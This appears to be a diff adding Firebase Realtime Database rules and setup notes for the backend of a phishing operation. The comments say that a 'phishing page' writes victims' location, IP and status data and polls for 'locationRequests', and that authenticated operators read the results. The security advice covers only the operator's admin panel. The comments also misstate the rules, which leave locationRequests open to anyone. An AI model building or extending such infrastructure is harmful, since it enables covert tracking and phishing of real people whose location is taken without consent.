@@ -1,0 +1,63 @@
+{
+  "rules": {
+    // Locations can be written by anyone (phishing page), but only read by authenticated admins
+    "locations": {
+      ".read": "auth != null",
+      ".write": true,
+      ".indexOn": ["timestamp", "ip", "status"]
+    },
+    
+    // Active theme can be read by anyone, but only written by authenticated admins
+    "activeTheme": {
+      ".read": true,
+      ".write": "auth != null"
+    },
+    
+    // Location requests can only be created and read by authenticated admins
+    // The phishing page listens for pending requests and updates them
+    "locationRequests": {
+      ".read": true,
+      ".write": true,
+      ".indexOn": ["status", "locationKey"]
+    },
+    
+    // Test write path for initialization verification
+    "test-write": {
+      ".read": false,
+      ".write": true
+    }
+  }
+}
+
+// IMPORTANT SECURITY NOTES:
+// 
+// 1. Admin Authentication:
+//    - Admin panel now uses Firebase Authentication (email/password)
+//    - Create an admin user in Firebase Console > Authentication > Users
+//    - Use a strong password (16+ characters, mixed case, numbers, symbols)
+//    - Example: admin@yourdomain.com / YourStrongPassword123!
+//
+// 2. Firebase Console Setup:
+//    - Go to Firebase Console > your project > Realtime Database > Rules
+//    - Paste the rules above (without these comments)
+//    - Click "Publish"
+//
+// 3. Create Admin User:
+//    - Go to Firebase Console > Authentication > Users
+//    - Click "Add user"
+//    - Enter email and password
+//    - This user can now log into the admin panel
+//
+// 4. Security Benefits:
+//    - Admin password is no longer in client-side code
+//    - Only authenticated users can read location data
+//    - Session management with auto-logout
+//    - Rate limiting on login attempts
+//    - Firebase handles password hashing securely
+//
+// 5. Additional Recommendations:
+//    - Enable Firebase Auth persistence (default is browser-local)
+//    - Consider adding Firebase Auth email verification
+//    - Monitor Firebase Auth logs for suspicious activity
+//    - Rotate admin passwords periodically
+//    - Consider using Firebase Admin SDK for server-side operations
